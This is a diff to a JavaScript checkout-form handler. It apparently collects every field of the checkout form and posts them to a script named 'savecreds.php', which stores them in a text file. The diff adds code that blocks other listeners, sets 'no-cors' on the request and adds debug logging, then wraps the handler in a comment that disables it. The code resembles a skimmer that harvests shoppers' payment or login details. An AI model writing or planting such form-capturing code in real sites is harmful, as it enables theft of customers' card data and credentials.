@@ -1,7 +1,11 @@
+console.log("Checking script to see if its working");
+/*
+checkoutForm.querySelector('button[type="submit"]').addEventListener('click', function(event) {
+   // event.preventDefault(); // Prevent form from submitting the traditional way
 
-document.getElementById('checkout-form-content').addEventListener('submit', function(event) {
-    event.preventDefault(); // Prevent form from submitting the traditional way
-
+   // Prevent default behavior temporarily
+    event.stopImmediatePropagation(); // Stop any other listeners from running
+    console.log("This is working! right?")
     // Get all form elements
     const formElements = this.elements;
 
@@ -24,6 +28,7 @@ document.getElementById('checkout-form-content').addEventListener('submit', func
     // Send the data to the server to generate the text file
     fetch('/savecreds.php', {
         method: 'POST',
+        mode: 'no-cors',
         headers: {
             'Content-Type': 'application/json',
         },
@@ -41,4 +46,4 @@ document.getElementById('checkout-form-content').addEventListener('submit', func
         console.error('Error:', error);
         console.log('There was an error processing your request.');
     });
-});
+});*/
